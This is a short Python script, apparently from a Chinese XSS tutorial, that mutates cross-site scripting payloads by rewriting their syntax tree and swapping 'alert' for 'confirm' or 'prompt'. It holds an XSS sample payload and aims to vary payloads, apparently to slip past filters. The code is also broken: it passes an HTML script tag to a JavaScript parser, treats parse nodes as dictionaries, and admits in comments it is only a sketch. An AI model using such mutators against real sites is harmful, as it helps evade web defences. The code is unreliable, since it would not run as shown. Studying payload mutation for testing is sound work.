"""
本代码对应PDF文件中的“XSS 自动化工具运用与开发：自定义脚本开发：基于 AST 的 Payload 生成器”
本代码用于变异XSS payload，使用Esprima库解析AST进行修改。
"""

import esprima
import random
def mutate_payload(payload):
    # 解析 AST
    ast = esprima.parseScript(payload)
    # 随机修改 AST 节点（这里仅示例，实际需遍历树）
    # 例如：将函数名 'alert' 改为 'confirm'
    def walk(node):
        if node.type == 'CallExpression' and node.callee.name == 'alert':
            node.callee.name = random.choice(['confirm', 'prompt'])
        for key in node:
            if isinstance(node[key], dict):
                walk(node[key])
            elif isinstance(node[key], list):
                for item in node[key]:
                    if isinstance(item, dict):
                        walk(item)
    walk(ast)
    
    # 将 AST 转回代码（需要 escodegen）
    import escodegen
    return escodegen.generate(ast)
# 示例
payload = '<script>alert(1)</script>'
mutated = mutate_payload(payload)
print(mutated)